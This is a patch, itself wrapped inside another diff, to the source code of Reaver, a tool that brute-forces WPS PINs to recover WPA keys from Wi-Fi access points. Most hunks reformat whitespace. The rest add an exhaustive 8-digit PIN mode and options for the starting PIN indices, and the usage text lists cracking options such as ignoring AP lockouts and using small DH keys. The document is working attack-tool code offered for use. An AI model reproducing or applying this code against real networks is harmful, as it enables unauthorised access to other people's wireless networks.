++	enum wsc_op_code opcode;        /* WFA opcode, received by exchange.c and used by builder.c */
+ 
+-        uint8_t eap_id;                 /* Tracks the EAP ID value for building EAP repsonse headers */
++	uint8_t eap_id;                 /* Tracks the EAP ID value for building EAP repsonse headers */
+ 
+-        uint16_t ap_capability;         /* Capability information of the target AP as specified in the AP's beacon packets */
++	uint16_t ap_capability;         /* Capability information of the target AP as specified in the AP's beacon packets */
+ 
+-        unsigned char bssid[MAC_ADDR_LEN];      /* Target BSSID */
++	unsigned char bssid[MAC_ADDR_LEN];      /* Target BSSID */
+ 
+-        unsigned char mac[MAC_ADDR_LEN];                /* Source MAC address */
++	unsigned char mac[MAC_ADDR_LEN];                /* Source MAC address */
+ 
+ 	unsigned char *ap_rates;	/* Supported rates IE data, as reported by the AP */
+ 
+@@ -122,22 +124,22 @@ struct globals
+ 
+ 	char *session;			/* Path to session file */
+ 
+-        char *ssid;                     /* Target SSID */
++	char *ssid;                     /* Target SSID */
+ 
+-        char *iface;                    /* Interface name */
++	char *iface;                    /* Interface name */
+ 
+-        char *pin;                      /* Pointer to the recovered WPS pin value */
++	char *pin;                      /* Pointer to the recovered WPS pin value */
+ 
+ 	char *exec_string;		/* Pointer to user-supplied command to execute upon success */
+ 
+-        enum nack_code nack_reason;     /* Stores the nack code for the last received WSC_NACK message */
++	enum nack_code nack_reason;     /* Stores the nack code for the last received WSC_NACK message */
+ 
+-        pcap_t *handle;                 /* Pcap handle */
++	pcap_t *handle;                 /* Pcap handle */
+ 
+-        struct wps_data *wps;           /* 
+-					 * wpa_supplicant's wps_data structure, needed for almost all wpa_supplicant
+-                                         * function calls.
+-                                         */
++	struct wps_data *wps;           /* 
++									 * wpa_supplicant's wps_data structure, needed for almost all wpa_supplicant
++									 * function calls.
++									 */
+ } *globule;
+ 
+ int globule_init();
+@@ -222,6 +224,8 @@ void set_static_p2(char *value);
+ char *get_static_p2(void);
+ void set_win7_compat(int value);
+ int get_win7_compat(void);
++void set_exhaustive(int value);
++int get_exhaustive(void);
+ void set_dh_small(int value);
+ int get_dh_small(void);
+ void set_external_association(int value);
+diff -rupN trunk/src/pins.c trunk_modif/src/pins.c
+--- trunk/src/pins.c	2013-06-29 13:30:46.255635714 +0200
++++ trunk_modif/src/pins.c	2013-06-29 13:37:26.202607700 +0200
+@@ -36,26 +36,59 @@
+ /* Builds a WPS PIN from the key tables */
+ char *build_wps_pin()
+ {
+-        char *key = NULL, *pin = NULL;
+-        int pin_len = PIN_SIZE + 1;
++	char *key = NULL, *pin = NULL, *p1_value = NULL, *p2_value = NULL;
++	int pin_len = PIN_SIZE + 1;
+ 
+-        pin = malloc(pin_len);
+-        key = malloc(pin_len);
+-        if(pin && key)
+-        {
+-                memset(key, 0, pin_len);
+-                memset(pin, 0, pin_len);
+-
+-                /* Generate a 7-digit pin from the given key index values */
+-                snprintf(key, pin_len, "%s%s", get_p1(get_p1_index()), get_p2(get_p2_index()));
++	pin = malloc(pin_len);
++	key = malloc(pin_len);
++	if(pin && key)
++	{
++		memset(key, 0, pin_len);
++		memset(pin, 0, pin_len);
+ 
+-                /* Generate and append the pin checksum digit */
+-                snprintf(pin, pin_len, "%s%d", key, wps_pin_checksum(atoi(key)));
++		if(get_static_p1())
++		{
++			p1_value = get_static_p1();
++		}
++		else
++		{
++			p1_value = get_p1(get_p1_index());
++		}
+ 
+-                free(key);
+-        }
++		if(get_static_p2())
++		{
++			p2_value = get_static_p2();
++		}
++		else
++		{
++			if(get_exhaustive())
++			{
++				p2_value = get_p1(get_p2_index());
++			}
++			else
++			{
++				p2_value = get_p2(get_p2_index());
++			}
++		}
++
++		if(get_exhaustive())
++		{
++			/* Generate an 8-digit pin from the given key index values */
++			snprintf(pin, pin_len, "%s%s", p1_value, p2_value);
++		}
++		else
++		{
++			/* Generate a 7-digit pin from the given key index values */
++			snprintf(key, pin_len, "%s%s", p1_value, p2_value);
++
++			/* Generate and append the pin checksum digit */
++			snprintf(pin, pin_len, "%s%d", key, wps_pin_checksum(atoi(key)));
++		}
++
++		free(key);
++	}
+ 
+-        return pin;
++	return pin;
+ }
+ 
+ /* 
+@@ -64,35 +97,35 @@ char *build_wps_pin()
+  */
+ char *build_next_pin()
+ {
+-        char *pin = NULL;
+-        struct wps_data *wps = get_wps();
++	char *pin = NULL;
++	struct wps_data *wps = get_wps();
+ 
+-        /* Remove previous pin */
+-        wps_registrar_invalidate_pin(wps->wps->registrar, wps->uuid_e);
++	/* Remove previous pin */
++	wps_registrar_invalidate_pin(wps->wps->registrar, wps->uuid_e);
+ 
+-        /* Build a new pin */
+-        pin = build_wps_pin();
+-        if(pin)
+-        {
+-                /* Add the new pin */
+-                if(wps_registrar_add_pin(wps->wps->registrar, NULL, (const u8 *) pin, PIN_SIZE, 0) != 0)
+-                {
+-                        free(pin);
+-                        pin = NULL;
+-                }
+-        }
++	/* Build a new pin */
++	pin = build_wps_pin();
++	if(pin)
++	{
++		/* Add the new pin */
++		if(wps_registrar_add_pin(wps->wps->registrar, NULL, (const u8 *) pin, PIN_SIZE, 0) != 0)
++		{
++			free(pin);
++			pin = NULL;
++		}
++	}
+ 
+-        return pin;
++	return pin;
+ }
+ 
+ /* Generate the p1 and p2 pin arrays */
+ void generate_pins()
+ {
+-        int i = 0, index = 0;
++	int i = 0, index = 0;
+ 
+ 	/* If the first half of the pin was not specified, generate a list of possible pins */
+-	if(!get_static_p1())
+-	{
++	//if(!get_static_p1())
++	//{
+ 		/* 
+ 		 * Look for P1 keys marked as priority. These are pins that have been 
+ 		 * reported to be commonly used on some APs and should be tried first. 
+@@ -105,29 +138,29 @@ void generate_pins()
+ 				index++;
+ 			}
+ 		}
+-        
++
+ 		/* Randomize the rest of the P1 keys */
+ 		for(i=0; index < P1_SIZE; i++)
+-        	{
+-	                if(!k1[i].priority)
+-	                {
+-	                        set_p1(index, k1[i].key);
+-	                        index++;
++		{
++			if(!k1[i].priority)
++			{
++				set_p1(index, k1[i].key);
++				index++;
+ 			}
+ 		}
+-        }
+-	else
+-	{
++	//}
++	//else
++	//{
+ 		/* If the first half of the pin was specified by the user, only use that */
+-		for(index=0; index<P1_SIZE; index++)
++		/*for(index=0; index<P1_SIZE; index++)
+ 		{
+ 			set_p1(index, get_static_p1());
+ 		}
+-	}
++	}*/
+ 
+ 	/* If the second half of the pin was not specified, generate a list of possible pins */
+-	if(!get_static_p2())
+-	{
++	//if(!get_static_p2())
++	//{
+ 		/* 
+ 		 * Look for P2 keys statically marked as priority. These are pins that have been 
+ 		 * reported to be commonly used on some APs and should be tried first. 
+@@ -142,24 +175,24 @@ void generate_pins()
+ 		}
+ 
+ 		/* Randomize the rest of the P2 keys */
+-        	for(i=0; index < P2_SIZE; i++)
+-        	{
+-                	if(!k2[i].priority)
+-                	{
+-                	        set_p2(index, k2[i].key);
+-                	        index++;
+-			}
+-                }
+-        }
+-	else
+-	{
++		for(i=0; index < P2_SIZE; i++)
++		{
++			if(!k2[i].priority)
++			{
++				set_p2(index, k2[i].key);
++				index++;
++			}
++		}
++	//}
++	//else
++	//{
+ 		/* If the second half of the pin was specified by the user, only use that */
+-		for(index=0; index<P2_SIZE; index++)
++		/*for(index=0; index<P2_SIZE; index++)
+ 		{
+ 			set_p2(index, get_static_p2());
+ 		}
+-	}
++	}*/
+ 
+-        return;
++	return;
+ }
+ 
+diff -rupN trunk/src/session.c trunk_modif/src/session.c
+--- trunk/src/session.c	2013-06-29 13:30:46.267635564 +0200
++++ trunk_modif/src/session.c	2013-06-29 13:37:26.206607650 +0200
+@@ -87,7 +87,7 @@ int restore_session()
+ 			answer = getc(stdin);
+ 			free(bssid);
+ 		}
+-	
++
+ 		if(answer == 'y' || answer == 'Y' || answer == '\n')
+ 		{
+ 			if((fp = fopen(file, "r")))
+@@ -97,13 +97,13 @@ int restore_session()
+ 				{
+ 					set_p1_index(atoi(line));
+ 					memset((char *) &line, 0, MAX_LINE_SIZE);
+-	
++
+ 					/* Get the key2 index value */
+ 					if(fgets((char *) &line, MAX_LINE_SIZE, fp) != NULL)
+ 					{
+ 						set_p2_index(atoi(line));
+ 						memset((char *) &line, 0, MAX_LINE_SIZE);
+-				
++
+ 						/* Get the key status value */
+ 						if(fgets((char *) &line, MAX_LINE_SIZE, fp) != NULL)
+ 						{
+@@ -139,7 +139,7 @@ int restore_session()
+ 						}
+ 					}
+ 				}
+-		
++
+ 				fclose(fp);
+ 			}
+ 			else
+@@ -149,12 +149,8 @@ int restore_session()
+ 		}
+ 	}
+ 
+-	if(!ret_val)
++	if(ret_val)
+ 	{
+-		set_p1_index(0);
+-		set_p2_index(0);
+-		set_key_status(KEY1_WIP);
+-	} else {
+ 		cprintf(INFO, "[+] Restored previous session\n");
+ 	}
+ 
+@@ -166,11 +162,11 @@ int save_session()
+ {
+ 	unsigned char *bssid = NULL;
+ 	char *wpa_key = NULL, *essid = NULL, *pretty_bssid = NULL;
+-        char file_name[FILENAME_MAX] = { 0 };
+-        char line[MAX_LINE_SIZE] = { 0 };
+-        FILE *fp = NULL;
++	char file_name[FILENAME_MAX] = { 0 };
++	char line[MAX_LINE_SIZE] = { 0 };
++	FILE *fp = NULL;
+ 	size_t write_size = 0;
+-        int attempts = 0, ret_val = 0, i = 0;
++	int attempts = 0, ret_val = 0, i = 0;
+ 	struct wps_data *wps = NULL;
+ 
+ 	wps = get_wps();
+@@ -182,7 +178,7 @@ int save_session()
+ 		wpa_key = wps->key;
+ 		essid = wps->essid;
+ 	}
+-	
++
+ 	if(!bssid || !pretty_bssid)
+ 	{
+ 		cprintf(CRITICAL, "[X] ERROR: Failed to save session data (memory error).\n");
+@@ -205,7 +201,7 @@ int save_session()
+ 			 */
+ 			if(configuration_directory_exists())
+ 			{
+-        			snprintf((char *) &file_name, FILENAME_MAX, "%s/%s.%s", CONF_DIR, bssid, CONF_EXT);
++				snprintf((char *) &file_name, FILENAME_MAX, "%s/%s.%s", CONF_DIR, bssid, CONF_EXT);
+ 			}
+ 			else
+ 			{
+@@ -232,9 +228,9 @@ int save_session()
+ 					if(fwrite((char *) &line, 1, write_size, fp) == write_size)
+ 					{
+ 						memset((char *) &line, 0, MAX_LINE_SIZE);
+-        		                	snprintf((char *) &line, MAX_LINE_SIZE, "%d\n", get_key_status());
+-        		                	write_size = strlen((char *) &line);
+-	
++						snprintf((char *) &line, MAX_LINE_SIZE, "%d\n", get_key_status());
++						write_size = strlen((char *) &line);
++
+ 						/* Save key status value */
+ 						if(fwrite((char *) &line, 1, write_size, fp) == write_size)
+ 						{
+@@ -281,7 +277,7 @@ int save_session()
+ 						}
+ 					}
+ 				}
+-				
++
+ 				fclose(fp);
+ 			}
+ 		}
+@@ -289,7 +285,7 @@ int save_session()
+ 		{
+ 			cprintf(VERBOSE, "[+] Nothing done, nothing to save.\n");
+ 		}
+-		
++
+ 		free(bssid);
+ 		free(pretty_bssid);
+ 	}
+diff -rupN trunk/src/wpscrack.c trunk_modif/src/wpscrack.c
+--- trunk/src/wpscrack.c	2013-06-29 13:30:46.259635664 +0200
++++ trunk_modif/src/wpscrack.c	2013-06-29 13:37:26.210607600 +0200
+@@ -127,7 +127,7 @@ int main(int argc, char **argv)
+ 	{
+ 		cprintf(CRITICAL, "[-] Failed to recover WPA key\n");
+ 	}
+-	
++
+ 	save_session();
+ 
+ end:
+@@ -137,48 +137,51 @@ end:
+ 
+ int usage(char *prog_name)
+ {
+-        float fail_timeout = 0;
++	float fail_timeout = 0;
+ 
+-        fail_timeout = ((float) M57_DEFAULT_TIMEOUT / (float) SEC_TO_US);
++	fail_timeout = ((float) M57_DEFAULT_TIMEOUT / (float) SEC_TO_US);
+ 
+-        fprintf(stderr, "Required Arguments:\n");
+-        fprintf(stderr, "\t-i, --interface=<wlan>          Name of the monitor-mode interface to use\n");
+-        fprintf(stderr, "\t-b, --bssid=<mac>               BSSID of the target AP\n");
+-
+-        fprintf(stderr, "\nOptional Arguments:\n");
+-        fprintf(stderr, "\t-m, --mac=<mac>                 MAC of the host system\n");
+-        fprintf(stderr, "\t-e, --essid=<ssid>              ESSID of the target AP\n");
+-        fprintf(stderr, "\t-c, --channel=<channel>         Set the 802.11 channel for the interface (implies -f)\n");
++	fprintf(stderr, "Required Arguments:\n");
++	fprintf(stderr, "\t-i, --interface=<wlan>          Name of the monitor-mode interface to use\n");
++	fprintf(stderr, "\t-b, --bssid=<mac>               BSSID of the target AP\n");
++
++	fprintf(stderr, "\nOptional Arguments:\n");
++	fprintf(stderr, "\t-m, --mac=<mac>                 MAC of the host system\n");
++	fprintf(stderr, "\t-e, --essid=<ssid>              ESSID of the target AP\n");
++	fprintf(stderr, "\t-c, --channel=<channel>         Set the 802.11 channel for the interface (implies -f)\n");
+ 	fprintf(stderr, "\t-o, --out-file=<file>           Send output to a log file [stdout]\n");
+ 	fprintf(stderr, "\t-s, --session=<file>            Restore a previous session file\n");
+ 	fprintf(stderr, "\t-C, --exec=<command>            Execute the supplied command upon successful pin recovery\n");
+ 	fprintf(stderr, "\t-D, --daemonize                 Daemonize reaver\n");
+ 	fprintf(stderr, "\t-a, --auto                      Auto detect the best advanced options for the target AP\n");
+-        fprintf(stderr, "\t-f, --fixed                     Disable channel hopping\n");
+-        fprintf(stderr, "\t-5, --5ghz                      Use 5GHz 802.11 channels\n");
+-        fprintf(stderr, "\t-v, --verbose                   Display non-critical warnings (-vv for more)\n");
+-        fprintf(stderr, "\t-q, --quiet                     Only display critical messages\n");
+-        fprintf(stderr, "\t-h, --help                      Show help\n");
+-        
+-        fprintf(stderr, "\nAdvanced Options:\n");
++	fprintf(stderr, "\t-f, --fixed                     Disable channel hopping\n");
++	fprintf(stderr, "\t-5, --5ghz                      Use 5GHz 802.11 channels\n");
++	fprintf(stderr, "\t-v, --verbose                   Display non-critical warnings (-vv for more)\n");
++	fprintf(stderr, "\t-q, --quiet                     Only display critical messages\n");
++	fprintf(stderr, "\t-h, --help                      Show help\n");
++
++	fprintf(stderr, "\nAdvanced Options:\n");
+ 	fprintf(stderr, "\t-p, --pin=<wps pin>             Use the specified 4 or 8 digit WPS pin\n");
+ 	fprintf(stderr, "\t-d, --delay=<seconds>           Set the delay between pin attempts [%d]\n", DEFAULT_DELAY);
+-        fprintf(stderr, "\t-l, --lock-delay=<seconds>      Set the time to wait if the AP locks WPS pin attempts [%d]\n", DEFAULT_LOCK_DELAY);
+-        fprintf(stderr, "\t-g, --max-attempts=<num>        Quit after num pin attempts\n");
+-        fprintf(stderr, "\t-x, --fail-wait=<seconds>       Set the time to sleep after %d unexpected failures [0]\n", WARN_FAILURE_COUNT);
+-        fprintf(stderr, "\t-r, --recurring-delay=<x:y>     Sleep for y seconds every x pin attempts\n");
+-        fprintf(stderr, "\t-t, --timeout=<seconds>         Set the receive timeout period [%d]\n", DEFAULT_TIMEOUT);
+-        fprintf(stderr, "\t-T, --m57-timeout=<seconds>     Set the M5/M7 timeout period [%.2f]\n", fail_timeout);
++	fprintf(stderr, "\t-l, --lock-delay=<seconds>      Set the time to wait if the AP locks WPS pin attempts [%d]\n", DEFAULT_LOCK_DELAY);
++	fprintf(stderr, "\t-g, --max-attempts=<num>        Quit after num pin attempts\n");
++	fprintf(stderr, "\t-x, --fail-wait=<seconds>       Set the time to sleep after %d unexpected failures [0]\n", WARN_FAILURE_COUNT);
++	fprintf(stderr, "\t-r, --recurring-delay=<x:y>     Sleep for y seconds every x pin attempts\n");
++	fprintf(stderr, "\t-t, --timeout=<seconds>         Set the receive timeout period [%d]\n", DEFAULT_TIMEOUT);
++	fprintf(stderr, "\t-T, --m57-timeout=<seconds>     Set the M5/M7 timeout period [%.2f]\n", fail_timeout);
+ 	fprintf(stderr, "\t-A, --no-associate              Do not associate with the AP (association must be done by another application)\n");
+ 	fprintf(stderr, "\t-N, --no-nacks                  Do not send NACK messages when out of order packets are received\n");
+ 	fprintf(stderr, "\t-S, --dh-small                  Use small DH keys to improve crack speed\n");
+-        fprintf(stderr, "\t-L, --ignore-locks              Ignore locked state reported by the target AP\n");
+-        fprintf(stderr, "\t-E, --eap-terminate             Terminate each WPS session with an EAP FAIL packet\n");
+-        fprintf(stderr, "\t-n, --nack                      Target AP always sends a NACK [Auto]\n");
++	fprintf(stderr, "\t-L, --ignore-locks              Ignore locked state reported by the target AP\n");
++	fprintf(stderr, "\t-E, --eap-terminate             Terminate each WPS session with an EAP FAIL packet\n");
++	fprintf(stderr, "\t-n, --nack                      Target AP always sends a NACK [Auto]\n");
+ 	fprintf(stderr, "\t-w, --win7                      Mimic a Windows 7 registrar [False]\n");
++	fprintf(stderr, "\t-X, --exhaustive                Set exhaustive mode from the beginning of the session [False]\n");
++	fprintf(stderr, "\t-1, --p1-index                  Set initial array index for the first half of the pin [False]\n");
++	fprintf(stderr, "\t-2, --p2-index                  Set initial array index for the second half of the pin [False]\n");
+ 
+-        fprintf(stderr, "\nExample:\n\t%s -i mon0 -b 00:90:4C:C1:AC:21 -vv\n\n", prog_name);
++	fprintf(stderr, "\nExample:\n\t%s -i mon0 -b 00:90:4C:C1:AC:21 -vv\n\n", prog_name);
+ 
+-        return EXIT_FAILURE;
++	return EXIT_FAILURE;
+ }
